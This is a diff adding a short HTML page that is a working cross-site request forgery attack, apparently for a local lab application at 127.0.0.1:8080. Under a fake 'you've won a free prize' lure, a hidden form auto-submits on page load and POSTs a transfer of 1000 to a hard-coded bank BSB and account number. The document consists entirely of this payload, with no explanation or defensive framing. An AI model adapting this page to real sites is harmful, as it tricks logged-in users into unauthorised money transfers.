@@ -1,0 +1,13 @@
+<html>
+ <body>
+   <h3>Congrats! You've won a free prize!</h3>
+   <form action="http://127.0.0.1:8080/transfer" method="POST" id="csrf-form">
+     <input type="hidden" name="bsb" value="666-666" />
+     <input type="hidden" name="account_no" value="987654321" />
+     <input type="hidden" name="amount" value="1000" />
+   </form>
+   <script>
+     document.getElementById('csrf-form').submit();
+   </script>
+ </body>
+</html>
